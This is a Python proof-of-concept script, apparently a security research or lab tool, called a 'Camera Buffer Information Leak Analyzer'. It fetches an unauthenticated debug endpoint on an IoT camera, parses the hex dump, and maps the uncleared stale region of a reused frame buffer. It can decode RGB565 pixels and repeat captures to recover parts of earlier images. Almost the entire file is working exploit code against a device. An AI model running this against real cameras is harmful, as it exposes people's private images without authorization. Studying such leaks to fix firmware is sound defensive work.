#!/usr/bin/env python3
"""
Camera Buffer Information Leak Analyzer

Fetches the /camera/debug-frame endpoint to read raw frame buffer data,
parses the hex dump, identifies leaked memory regions beyond the preview
frame, and optionally decodes RGB565 pixel data.
"""

import argparse
import re
import sys
import urllib.request
import urllib.error


DEFAULT_TARGET = "http://192.168.4.1"

# Expected buffer parameters from firmware
FULL_FRAME_SIZE = 614400    # 640x480x2 (RGB565)
PREVIEW_FRAME_SIZE = 153600  # 320x240x2 (RGB565)
STALE_REGION_OFFSET = 0x25800  # 153600 in hex


def fetch_url(url, timeout=15):
    """Fetch a URL and return (status_code, body_text)."""
    try:
        req = urllib.request.Request(url)
        resp = urllib.request.urlopen(req, timeout=timeout)
        body = resp.read().decode("utf-8", errors="replace")
        return resp.getcode(), body
    except urllib.error.HTTPError as e:
        body = ""
        try:
            body = e.read().decode("utf-8", errors="replace")
        except Exception:
            pass
        return e.code, body
    except urllib.error.URLError as e:
        print(f"ERROR: Could not connect to {url}: {e.reason}", file=sys.stderr)
        sys.exit(1)


def parse_debug_frame(text):
    """Parse the debug-frame response and extract buffer info and hex data."""
    result = {
        "full_size": None,
        "preview_size": None,
        "offsets": {},
        "raw_text": text,
    }

    # Parse buffer sizes
    m = re.search(r"Full frame size:\s*(\d+)", text)
    if m:
        result["full_size"] = int(m.group(1))

    m = re.search(r"Preview frame size:\s*(\d+)", text)
    if m:
        result["preview_size"] = int(m.group(1))

    # Parse hex dump lines: "Offset 0xNNNN: XX XX XX ..."
    for m in re.finditer(r"Offset (0x[0-9A-Fa-f]+):\s*((?:[0-9A-Fa-f]{2}\s*)+)", text):
        offset = int(m.group(1), 16)
        hex_bytes = m.group(2).strip().split()
        result["offsets"][offset] = [int(b, 16) for b in hex_bytes]

    return result


def analyze_buffer(info):
    """Analyze parsed buffer data and report findings."""
    full = info["full_size"] or FULL_FRAME_SIZE
    preview = info["preview_size"] or PREVIEW_FRAME_SIZE
    leaked = full - preview

    print()
    print("Buffer Layout Analysis")
    print("=" * 60)
    print()
    print(f"  Full frame buffer:  {full:>10,} bytes ({full // 1024} KB)")
    print(f"  Preview frame:      {preview:>10,} bytes ({preview // 1024} KB)")
    print(f"  Stale data region:  {leaked:>10,} bytes ({leaked // 1024} KB)")
    print(f"  Leak percentage:    {leaked * 100 / full:.1f}%")
    print()

    # Analyze hex dumps at each offset
    if info["offsets"]:
        print("Hex Dump Analysis")
        print("-" * 60)
        for offset, data_bytes in sorted(info["offsets"].items()):
            region = "PREVIEW (current)" if offset < preview else "STALE (leaked)"
            unique_vals = set(data_bytes)
            byte_str = " ".join(f"{b:02X}" for b in data_bytes)

            print(f"  Offset 0x{offset:05X} ({offset:>6d}): [{region}]")
            print(f"    Bytes: {byte_str}")

            if len(unique_vals) == 1:
                val = list(unique_vals)[0]
                print(f"    Pattern: uniform 0x{val:02X} ({len(data_bytes)} bytes)")
            else:
                print(f"    Pattern: mixed ({len(unique_vals)} unique values)")
            print()

    # Memory map
    print("Memory Map")
    print("-" * 60)
    print(f"  0x00000 +{'=' * 40}+")
    print(f"          | Preview frame data               |  {preview:,} bytes")
    print(f"          | (current capture, expected data)  |")
    print(f"  0x{preview:05X} +{'=' * 40}+")
    print(f"          | STALE DATA (previous frame)      |  {leaked:,} bytes")
    print(f"          | NOT CLEARED between captures     |")
    print(f"          | May contain sensitive image data  |")
    print(f"  0x{full:05X} +{'=' * 40}+")
    print()

    # RGB565 pixel count
    stale_pixels = leaked // 2  # 2 bytes per pixel in RGB565
    print("Reconstructable Image Data")
    print("-" * 60)
    print(f"  Stale region: {leaked:,} bytes = {stale_pixels:,} pixels (RGB565)")
    print(f"  Equivalent to: ~{stale_pixels // 640}x640 or ~{stale_pixels // 480}x480 partial image")
    print(f"  A previous full-resolution capture can be partially recovered")
    print()

    return leaked


def decode_rgb565_sample(data_bytes):
    """Decode a sample of RGB565 pixel values to show what they represent."""
    if len(data_bytes) < 2:
        return

    print("RGB565 Pixel Decode (sample)")
    print("-" * 60)
    for i in range(0, min(len(data_bytes), 16), 2):
        if i + 1 >= len(data_bytes):
            break
        # RGB565: RRRRRGGG GGGBBBBB (big-endian in memory on ESP32)
        pixel = (data_bytes[i] << 8) | data_bytes[i + 1]
        r = ((pixel >> 11) & 0x1F) << 3
        g = ((pixel >> 5) & 0x3F) << 2
        b = (pixel & 0x1F) << 3
        print(f"  Pixel {i // 2}: 0x{pixel:04X} -> R={r:3d} G={g:3d} B={b:3d}")
    print()


def main():
    parser = argparse.ArgumentParser(
        description="Fetch and analyze camera debug frame buffer data to identify "
                    "leaked memory regions from buffer reuse without clearing.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s
      Fetch /camera/debug-frame from default target and display raw response

  %(prog)s --analyze
      Fetch and perform full buffer layout analysis with memory map

  %(prog)s --target http://192.168.4.1 --analyze
      Analyze buffer leak on specified target

  %(prog)s --output raw_frame.txt --analyze
      Save raw response and perform analysis

  %(prog)s --analyze --decode-rgb565
      Include RGB565 pixel decoding of leaked buffer samples
""")
    parser.add_argument("--target", "-t", default=DEFAULT_TARGET,
                        help="Device URL (default: %(default)s)")
    parser.add_argument("--output", "-o",
                        help="Save raw debug-frame response to file")
    parser.add_argument("--analyze", "-a", action="store_true",
                        help="Perform detailed memory region analysis")
    parser.add_argument("--decode-rgb565", action="store_true",
                        help="Decode RGB565 pixel samples from hex dump data")
    parser.add_argument("--repeat", "-r", type=int, default=1,
                        help="Number of times to fetch (for change detection, default: 1)")
    parser.add_argument("--interval", type=float, default=2.0,
                        help="Interval between repeated fetches in seconds (default: 2.0)")

    args = parser.parse_args()

    target = args.target.rstrip("/")
    url = f"{target}/camera/debug-frame"

    print("=" * 60)
    print("Camera Buffer Information Leak Analyzer")
    print("=" * 60)
    print()

    import time

    all_stale_patterns = []

    for attempt in range(args.repeat):
        if args.repeat > 1:
            print(f"--- Capture {attempt + 1}/{args.repeat} ---")

        print(f"[*] Fetching {url} (no authentication required)...")
        status, body = fetch_url(url)

        if status != 200:
            print(f"[!] HTTP {status} - endpoint returned error")
            print(f"    Response: {body[:200]}")
            if status == 404:
                print("    The /camera/debug-frame endpoint may not exist on this firmware build.")
            sys.exit(1)

        print(f"[+] HTTP {status} OK - debug frame data received")
        print()
        print("--- Raw Response ---")
        print(body.rstrip())
        print("--- End Response ---")

        if args.output:
            suffix = f".{attempt}" if args.repeat > 1 else ""
            outfile = args.output + suffix
            with open(outfile, "w") as f:
                f.write(body)
            print(f"\n[+] Raw response saved to: {outfile}")

        info = parse_debug_frame(body)

        if args.analyze:
            leaked = analyze_buffer(info)

            if args.decode_rgb565 and info["offsets"]:
                # Decode samples from each offset
                for offset, data_bytes in sorted(info["offsets"].items()):
                    print(f"  At offset 0x{offset:05X}:")
                    decode_rgb565_sample(data_bytes)

            # Track stale patterns for change detection
            stale_data = {k: v for k, v in info["offsets"].items()
                          if k >= (info["preview_size"] or PREVIEW_FRAME_SIZE)}
            all_stale_patterns.append(stale_data)

        if attempt < args.repeat - 1:
            time.sleep(args.interval)

    # Change detection across captures
    if args.repeat > 1 and len(all_stale_patterns) > 1:
        print()
        print("Change Detection")
        print("-" * 60)
        changed = False
        for i in range(1, len(all_stale_patterns)):
            if all_stale_patterns[i] != all_stale_patterns[0]:
                changed = True
                print(f"  [!] Stale data CHANGED between capture 1 and {i + 1}")
                print(f"      Different previous frames are being leaked.")

        if not changed:
            print("  [*] Stale data is consistent across all captures.")
            print("      In a real camera, different scenes would produce")
            print("      different leaked data on each capture.")
        print()

    print()
    print("[*] Done.")


if __name__ == "__main__":
    main()
